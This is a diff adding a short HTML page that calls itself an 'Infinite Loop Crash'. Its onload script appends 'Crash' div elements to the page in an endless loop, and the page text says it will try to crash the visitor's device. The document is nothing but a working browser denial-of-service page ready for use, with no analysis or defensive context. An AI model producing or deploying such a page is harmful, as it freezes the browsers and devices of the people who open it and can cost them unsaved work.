@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Infinite Loop Crash</title>
+    <script>
+        function crashDevice() {
+            for (let i = 0; i < Infinity; i++) {
+                let elem = document.createElement('div');
+                elem.innerHTML = 'Crash';
+                document.body.appendChild(elem);
+            }
+        }
+    </script>
+</head>
+<body onload="crashDevice()">
+    <p>This page will attempt to crash your device.</p>
+</body>
+</html>
